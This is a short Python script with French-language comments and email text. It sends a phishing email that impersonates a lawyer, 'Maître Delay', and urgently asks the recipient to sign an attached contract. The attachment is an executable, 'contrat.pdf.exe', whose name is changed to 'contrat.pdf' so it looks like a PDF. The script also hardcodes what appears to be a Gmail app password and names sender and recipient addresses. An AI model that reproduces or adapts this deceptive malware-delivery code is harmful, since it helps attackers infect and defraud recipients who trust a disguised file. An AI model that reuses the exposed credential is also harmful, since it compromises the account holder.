import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Config SMTP
smtp_server = "smtp.gmail.com"
smtp_port = 587
username = "anneviola8@gmail.com"
password = "cmgi pzxk ukwi lmmi"

# Création du message
msg = MIMEMultipart()
msg['From'] = username
msg['To'] = "B.anneflore@yahoo.fr"
msg['Subject'] = "Urgent : mise à jour de contrat"

body = """
Bonjour,

Je reviens vers vous concernant le contrat ci-joint. Merci de vérifier le paragraphe souligné en rouge et d'apposer votre signature.


Cordialement,

Maitre Delay.
"""
msg.attach(MIMEText(body, 'plain'))

# Ajout de la pièce jointe
attachment_path = "dist/contrat.pdf.exe"
attachment = MIMEBase('application', 'octet-stream')
with open(attachment_path, 'rb') as f:
    attachment.set_payload(f.read())
encoders.encode_base64(attachment)
attachment.add_header('Content-Disposition', 'attachment; filename="contrat.pdf"')
msg.attach(attachment)

# Envoi du mail
try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(username, password)
    server.sendmail(username, msg['To'], msg.as_string())
    print("Email envoyé avec succès !")
except Exception as e:
    print(f"Erreur : {e}")
finally:
    server.quit()
